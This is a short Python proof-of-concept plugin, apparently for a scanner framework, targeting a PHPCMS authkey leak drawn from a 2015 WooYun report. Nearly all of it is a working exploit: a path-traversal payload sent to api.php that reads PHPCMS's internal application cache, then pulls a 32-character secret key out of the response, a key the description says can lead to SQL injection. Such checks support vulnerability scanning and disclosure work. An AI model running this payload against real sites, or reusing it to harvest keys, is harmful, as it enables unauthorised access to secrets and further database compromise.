# Author:w8ay
# Name:测试DEMO
'''
name: phpcms authkey泄露
referer: http://wooyun.org/bugs/wooyun-2015-0105242
author: Lucifer
description: PHPCMS authkey 泄露漏洞，可引起SQL注入。
'''
import HackRequests
import re

def poc(arg, **kwargs):
    payload = "/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&path=admin"
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(vulnurl)
    if hh.status_code != 200:
        return False
    m = re.search('(\w{32})', hh.text())
    if m:
        result = {
            "name": "PHPCMS authkey leak",  # 插件名称
            "content": "PHPCMS authkey泄露漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": vulnurl,  # 漏洞存在url
            "log": hh.log,
            "tag": "info_leak"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass